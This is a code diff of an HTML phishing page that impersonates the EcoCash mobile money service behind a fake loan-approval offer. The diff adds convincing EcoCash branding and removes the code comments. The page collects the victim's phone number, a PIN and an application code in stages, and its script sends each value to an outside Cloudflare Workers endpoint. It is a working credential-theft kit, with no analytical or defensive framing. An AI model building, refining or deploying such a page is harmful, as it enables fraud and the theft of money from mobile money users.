@@ -3,119 +3,205 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ECO CASH | Verification</title>
+<title>EcoCash | Verification</title>
 <style>
-* { box-sizing: border-box; }
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: #f1f4f8;
-  color: #000080;
-}
-header {
-  background: #000080;
-  color: white;
-  padding: 35px 15px;
-  text-align: center;
-}
-header h1 { font-size: 32px; margin: 0; }
-header p { margin-bottom: 0; color: #d5e4f5; }
-main {
-  background: white;
-  max-width: 430px;
-  margin: 35px auto;
-  padding: 28px;
-  border-radius: 14px;
-  box-shadow: 0 5px 25px #00000012;
-  color: #000080;
-}
-label {
-  display: block;
-  font-weight: bold;
-  margin: 20px 0 8px;
-  color: #000080;
-}
-input {
-  width: 100%;
-  padding: 14px;
-  border: 1px solid #ccd3df;
-  border-radius: 7px;
-  font-size: 16px;
-  color: #000080;
-}
-input:focus {
-  outline: 2px solid #0c4ac2;
-  border-color: transparent;
-}
-button {
-  width: 100%;
-  padding: 15px;
-  background: #0c4ac2;
-  border: none;
-  border-radius: 7px;
-  color: white;
-  font-size: 16px;
-  font-weight: bold;
-  margin-top: 18px;
-  cursor: pointer;
-  transition: background 0.2s ease;
-}
-button:hover {
-  background: #093996;
-}
-.status {
-  margin-top: 18px;
-  padding: 13px;
-  background: #eef2ff;
-  border-radius: 7px;
-  color: #000080;
-  text-align: center;
-  border: 1px solid #c7d2fe;
-}
-.hidden { display: none; }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f4f6f9;
+    color: #17243a;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
+  .container {
+    width: 100%;
+    max-width: 450px;
+    padding: 20px;
+  }
+  /* Top Branding Header Card */
+  .brand-card {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+    position: relative;
+    overflow: hidden;
+    padding: 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .brand-card::after {
+    content: '';
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 4px;
+    background: #10a343; /* EcoCash Green Accent Bar */
+  }
+  .brand-logo {
+    font-size: 28px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+  }
+  .brand-logo span.eco { color: #002D62; } /* Navy Blue */
+  .brand-logo span.cash { color: #E31B23; } /* EcoCash Red */
+  
+  .user-section {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+  }
+  .user-icon {
+    width: 36px;
+    height: 36px;
+    background: #e6edf8;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #002D62;
+    margin-bottom: 4px;
+  }
+  .user-icon svg {
+    width: 20px;
+    height: 20px;
+    fill: currentColor;
+  }
+  .welcome-text {
+    font-size: 13px;
+    font-weight: bold;
+    color: #333;
+  }
+
+  /* Subheader Hero Section */
+  .hero-content {
+    text-align: center;
+    margin: 30px 0 20px;
+  }
+  .hero-content h1 {
+    font-size: 24px;
+    color: #10a343; /* EcoCash Green */
+    margin: 0 0 8px 0;
+    font-weight: 700;
+  }
+  .hero-content p {
+    font-size: 14px;
+    color: #555;
+    margin: 0;
+  }
+
+  /* Form Container */
+  main {
+    background: white;
+    padding: 28px;
+    border-radius: 14px;
+    box-shadow: 0 5px 25px rgba(0, 0, 0, 0.08);
+  }
+  label {
+    display: block;
+    font-weight: bold;
+    margin: 15px 0 8px;
+    color: #002D62;
+  }
+  input {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #ccd3df;
+    border-radius: 7px;
+    font-size: 16px;
+    color: #17243a;
+  }
+  input:focus {
+    outline: 2px solid #10a343;
+    border-color: transparent;
+  }
+  button {
+    width: 100%;
+    padding: 15px;
+    background: #10a343;
+    border: none;
+    border-radius: 7px;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    margin-top: 20px;
+    cursor: pointer;
+    transition: background 0.2s ease;
+  }
+  button:hover {
+    background: #0d8737;
+  }
+  .status {
+    margin-top: 18px;
+    padding: 13px;
+    background: #edf8f1;
+    border-radius: 7px;
+    color: #10a343;
+    text-align: center;
+    border: 1px solid #c3e6cb;
+    font-weight: bold;
+  }
+  .hidden { display: none; }
 </style>
 </head>
 <body>
 
-<header>
-  <h1>ECO $ CASH</h1>
-  <p>Application verification portal</p>
-</header>
+<div class="container">
 
-<main>
-  <h2>Secure Verification</h2>
-  <p>Please complete the following verification stages.</p>
-
-  <section id="phoneStage">
-    <label for="phone">Phone Number</label>
-    <input id="phone" type="tel"
-      placeholder="+263 7XXXXXXXX"
-      autocomplete="tel" required>
-    <button id="phoneButton">Continue</button>
-  </section>
-
-  <section id="pinStage" class="hidden">
-    <label for="pin">Application PIN</label>
-    <input id="pin" type="password"
-      placeholder="Enter your application PIN"
-      autocomplete="off">
-    <button id="pinButton">Continue</button>
-  </section>
-
-  <section id="codeStage" class="hidden">
-    <label for="code">Application Code</label>
-    <input id="code" type="text"
-      placeholder="Enter your assigned application code"
-      autocomplete="off">
-    <button id="codeButton">Submit</button>
-  </section>
-
-  <div id="waiting" class="hidden">
-    <h2>Application Submitted</h2>
-    <p>Your details have been submitted for review.</p>
-    <div class="status">Waiting for application review.</div>
+  <!-- EcoCash Header Card -->
+  <div class="brand-card">
+    <div class="brand-logo">
+      <span class="eco">Eco</span><span class="cash">Cash</span>
+    </div>
+    <div class="user-section">
+      <div class="user-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+        </svg>
+      </div>
+      <span class="welcome-text">Welcome</span>
+    </div>
   </div>
-</main>
+
+  <!-- Hero Sub-header -->
+  <div class="hero-content">
+    <h1>Get Your Loan Approved Fast</h1>
+    <p>Quick approval • Competitive rates • Flexible terms</p>
+  </div>
+
+  <!-- Main Verification Stages -->
+  <main>
+    <section id="phoneStage">
+      <label for="phone">Phone Number</label>
+      <input id="phone" type="tel" placeholder="+263 7XXXXXXXX" autocomplete="tel" required>
+      <button id="phoneButton">Continue</button>
+    </section>
+
+    <section id="pinStage" class="hidden">
+      <label for="pin">Application PIN</label>
+      <input id="pin" type="password" placeholder="Enter your application PIN" autocomplete="off">
+      <button id="pinButton">Continue</button>
+    </section>
+
+    <section id="codeStage" class="hidden">
+      <label for="code">Application Code</label>
+      <input id="code" type="text" placeholder="Enter your assigned application code" autocomplete="off">
+      <button id="codeButton">Submit</button>
+    </section>
+
+    <div id="waiting" class="hidden">
+      <h2 style="color:#002D62; margin-top:0;">Application Submitted</h2>
+      <p style="color:#555;">Your details have been submitted for review.</p>
+      <div class="status">Waiting for application review.</div>
+    </div>
+  </main>
+
+</div>
 
 <script>
 const phoneStage = document.getElementById("phoneStage");
@@ -125,7 +211,6 @@ const waiting = document.getElementById("waiting");
 
 const API_URL = "https://quickcash-backend.doviaskipmoi.workers.dev/notify";
 
-// Store user entries across stages
 let applicationPhone = "";
 let applicationPin = "";
 
@@ -157,9 +242,7 @@ document.getElementById("phoneButton").onclick = async () => {
   applicationPhone = phone;
 
   try {
-    // 1. Send independent notification for phone number
     await sendNotification("phone_submitted", { phone: applicationPhone });
-    
     phoneStage.classList.add("hidden");
     pinStage.classList.remove("hidden");
   } catch {
@@ -178,7 +261,6 @@ document.getElementById("pinButton").onclick = async () => {
   applicationPin = pin;
 
   try {
-    // 2. Send independent notification for the PIN (includes phone + pin)
     await sendNotification("pin_submitted", { 
       phone: applicationPhone, 
       pin: applicationPin 
@@ -200,7 +282,6 @@ document.getElementById("codeButton").onclick = async () => {
   }
 
   try {
-    // 3. Send independent notification for the Code (includes phone + pin + code)
     await sendNotification("code_submitted", {
       phone: applicationPhone,
       pin: applicationPin,
